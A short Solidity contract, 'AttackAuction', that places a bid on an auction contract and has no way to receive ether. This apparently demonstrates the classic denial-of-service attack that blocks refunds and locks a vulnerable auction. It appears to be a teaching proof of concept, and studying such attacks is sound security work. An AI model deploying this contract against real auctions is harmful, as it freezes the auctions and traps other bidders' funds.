// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.30;

interface IAuction {
    function bid() external payable;
}

contract AttackAuction {

    IAuction auction;

    constructor(IAuction _auctionAddr) {
        auction = _auctionAddr;
    }

    function attack() external payable {
        auction.bid{value: msg.value}();
    }
}
